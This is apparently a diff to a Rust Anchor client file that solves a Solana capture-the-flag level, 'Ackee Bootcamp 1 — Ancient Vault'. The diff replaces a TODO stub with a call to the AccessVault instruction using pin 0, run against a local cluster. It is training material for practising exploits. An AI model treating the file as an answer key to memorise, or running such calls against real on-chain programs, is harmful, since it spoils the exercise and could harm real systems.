@@ -1,4 +1,4 @@
-//! Ackee 1 — Ancient Vault.
+//! Ackee Bootcamp 1 — Ancient Vault.
 //!
 //! Goal: Make the program create its `ancient_vault` account — the vault
 //! PDA (seed `ancient_vault`) existing on chain is the solved state.
@@ -17,7 +17,9 @@
 //! (HINTS are the upstream's progressive spoilers — open only if you
 //! want them.)
 
-use anchor_client::{Client, Cluster};
+use anchor_client::{
+    Client, Cluster, anchor_lang::solana_program::system_program,
+};
 use ctf::solana::ackee::level_1::*;
 
 pub struct Exploit;
@@ -28,8 +30,7 @@ pub async fn attack(
 ) -> eyre::Result<()> {
     // Starter context from the upstream exploit harness:
     // offender is the funded fresh keypair; the vault PDA is
-    let vault = target.vault_pda();
-    println!("Vault: {vault}");
+    let ancient_vault = target.vault_pda();
 
     // Typed program handle — the sol! equivalent for Anchor programs.
     // Level 1's types (instruction args, account structs) are re-exported
@@ -37,7 +38,16 @@ pub async fn attack(
     let client = Client::new(Cluster::Localnet, offender.keypair.clone());
     let program = client.program(target.program_id)?;
 
-    // TODO: exploit the level
-    let _ = program;
+    program
+        .request()
+        .accounts(accounts::AccessVault {
+            system_program: system_program::ID,
+            explorer: offender.pubkey(),
+            ancient_vault,
+        })
+        .args(instruction::AccessVault { _pin: 0 })
+        .send()
+        .await?;
+
     Ok(())
 }
